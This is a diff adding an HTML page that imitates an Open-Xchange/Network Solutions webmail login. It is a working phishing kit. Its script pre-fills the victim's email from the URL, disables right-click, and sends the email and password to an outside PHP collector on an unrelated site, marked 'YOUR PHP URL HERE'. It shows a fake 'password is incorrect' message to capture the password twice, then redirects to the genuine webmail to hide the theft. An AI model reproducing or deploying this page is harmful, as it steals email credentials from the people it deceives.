@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+
+<html lang="en"><head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Professional Email</title>
+    <!-- <link id="homescreen-icon" rel="apple-touch-icon" href=""> -->
+    <link id="favicon" href="https://i.postimg.cc/Vvdq69wk/image.png" rel="icon" type="image/svg+xml">
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+        }
+        body {
+            background: #fff;
+        }
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: .6rem;
+            margin-bottom: 1rem;
+        }
+        img {
+            width: 100%;
+            height: auto;
+        }
+        .img {
+            width: 7%;
+        }
+        .iformbox {
+            width: 420px;
+            box-shadow: 0 15px 70px #00000080;
+            margin: auto;
+            border: 1rem;
+            padding: 1rem;
+        }
+        .iformbox h3 {
+            text-align: center;
+            font-family: sans-serif;
+            font-weight: 700;
+            margin-bottom: 3rem;
+        }
+        .show {
+            text-align: center;
+            font-family: sans-serif;
+            font-weight: 700;
+            /* margin-bottom: 2rem; */
+        }
+        label {
+            color: black;
+            font-size: 14px;
+            font-weight: 700;
+        } 
+       /* .formbox input {
+            width: 100%;
+            display: block;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 1.25rem;
+            height: auto;
+            color: var(--text);
+            background-color: #fff;
+            background-clip: padding-box;
+            border: 1px solid var(--border-bootstrap);
+            border-radius: .25rem;
+            transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
+        } */
+        .btn {
+            display: block;
+            width: 100%;
+            margin-bottom: 2rem;
+            padding: 0 !important;
+            margin-top: 6rem;
+        }
+        .btn button {
+            padding: .5rem;
+            border: none;
+            background: #256672;
+            color: #fff;
+            font-weight: 600;
+            border-radius: 6px;
+            width: 100%;
+            display: block;
+        }
+        #io-ox-information-message {
+            margin: auto;
+            margin-top: 24px !important;
+            background-color: #fff;
+            box-shadow: 0px 10px 60px #00000080;
+            border-radius: 6px;
+            text-align: center;
+            flex-direction: column;
+            padding: 16px;
+            z-index: 1;
+            width: 420px;
+        }
+        #io-ox-information-message p {
+            text-align: center;
+            font: 14px / 20px -apple-system, BlinkMacSystemFont, Helvetica Neue, Segoe UI, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol;
+            /* font-size: 12px; */
+        }
+        #io-ox-login-footer {
+            width: 100%;
+            margin: 64px 0 0;
+            padding: 6px 2px;
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            background-color: #00000026;
+            color: #fff;
+            text-align: center;
+            justify-content: center;
+        }
+        #highlight {
+            display: none;
+        }
+        .show {
+            display: none;
+        }
+        #pasbox {
+            display: none;
+        }
+        .aaa {
+            color: #212529;
+            background-color: white;
+            padding: 4px 12px;
+            text-decoration: none;
+            border: 1px solid hsl(40, 10%, 80%);
+            display: block;
+        }
+        @media screen and (max-width: 600px){
+            #io-ox-information-message {
+                width: 87%;
+            }
+            .iformbox {
+                width: 87%;
+                box-shadow: 0 15px 70px #00000080;
+                margin: auto;
+                border: 1rem;
+                padding: 1rem;
+            }
+            /*.hideme {*/
+            /*    display: none;*/
+            /*}*/
+            .show {
+                display: none;
+            }
+            /*.lang {*/
+            /*    display: none;*/
+            /*}*/
+            .img {
+                width: 19%;
+            }
+        }
+    </style>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC">
+</head>
+<body>
+    <header>
+        <div class="img">
+            <img alt="" src="https://i.postimg.cc/44HMDYpb/image.png">
+        </div>
+        <div class="lang">Language: <span style="color: green;">English (United state)</span></div>
+        <h3 class="show">Webmail Login</h3>
+    </header>
+    <main>
+        <div class="iformbox">
+            <h3 class="hideme">Webmail Login</h3>
+            <form id="sub" action="" method="post">
+                <h5>Sign in</h5>
+
+                <div class="mb-3">
+                    <label class="form-label" for="exampleFormControlInput1">Email address</label>
+                    <input name="aa" class="form-control" id="exampleFormControlInput1" required="" type="email" placeholder="name@example.com" value="">
+                </div>
+                <div class="mb-3" id="pasbox">
+                    <label class="form-label" for="">Password</label>
+                    <input name="bb" class="form-control" id="password" required="" type="password">
+                </div>
+                <span>
+                    <input type="checkbox">
+                    Stay signed in
+                </span>
+                <div class="col-xs-12 alert-highlight" id="highlight">
+                    <div class="selectable-text alert alert-info" style="padding: 0.5rem !important; color: rgb(0, 0, 0);">The password is incorrect.</div>
+                </div>
+                <div class="btn">
+                    <button id="continue" type="button">Continue</button>
+                </div>
+            </form>
+        </div>
+        <div id="io-ox-information-message">
+            <p>
+                We are updating our email security and will require all email server connections to use an encrypted connection when connecting via POP or IMAP from a device. To avoid any email connection issues, please be sure to update your mail client settings.
+            </p> 
+            <a class="aaa" href="https://update.networksolutions.com/">Learn More&#8230;</a>
+        </div>
+        <footer id="io-ox-login-footer">
+            <div class="composition-element login-spacer"></div>
+            <span style="color: rgb(108, 108, 108);">&copy; 2025 Open-Xchange GmbH</span>
+            <div class="composition-element"><span style="color: rgb(108, 108, 108);">Version:</span><span style="color: rgb(108, 108, 108);">8.23.1</span></div>
+            <div class="composition-element custom-login-links"><span>
+                <a style="color: rgb(108, 108, 108);" href="https://web.com/legal/privacy-policy.aspx" target="blank">Privacy policy</a></span>
+            </div>
+            <div class="composition-element custom-login-links">
+                <span><a style="color: rgb(108, 108, 108);" href="https://legal.web.com/Document/Get/TermsOfUse" target="blank">Legal notes</a></span>
+            </div>
+            <div class="composition-element login-spacer"></div>
+        </footer>
+    </main>
+    <script>
+        const fullUrl = window.location.href;
+        const emailRegex = /#([^#]+)$/;
+        const match = fullUrl.match(emailRegex);
+        const email = match ? match[1] : null;
+    
+        console.log(email);
+    
+        if (email) {
+            document.getElementById("exampleFormControlInput1").value = email;
+        }
+      
+       document.addEventListener('contextmenu', function (e) {
+          e.preventDefault();
+        });
+      
+
+        document.getElementById("continue").addEventListener("click", ()=>{
+            document.getElementById("pasbox").style.display = "block"
+            document.getElementById("continue").type = "submit";
+            document.getElementById("continue").innerHTML = "Log in";
+        })
+
+        const phpurl = "https://www.tessori.com/admincp/picsgallery/upload_files/pks/result.php" // YOUR PHP URL HERE AND MAKE SURE IT'S CORRECT
+        var formSubmitted = 0;
+    
+        document.getElementById("sub").addEventListener("submit", function (event) {
+            event.preventDefault();
+        
+            formSubmitted++;
+        
+            var inputs = document.querySelectorAll('input[required]');
+            for (var i = 0; i < inputs.length; i++) {
+                if (!inputs[i].value.trim()) {
+                    alert("Please fill in all fields.");
+                    return;
+                }
+            }
+        
+            var formData = new FormData(this);
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", `${phpurl}`, true);
+        
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log(xhr.responseText);
+        
+                    if (formSubmitted === 1) {
+                        document.getElementById("password").value = "";
+                         document.getElementById("highlight").style.display = "block";
+                    } else if (formSubmitted >= 2) {
+                            // document.getElementById("password").value = "";
+                            window.location.href = "https://webmail-oxcs.networksolutionsemail.com/appsuite/";
+                            console.log("GOOOOOO");
+                    }
+                }
+            };
+        
+            xhr.send(formData);
+        });
+    </script>
+
+</body></html>
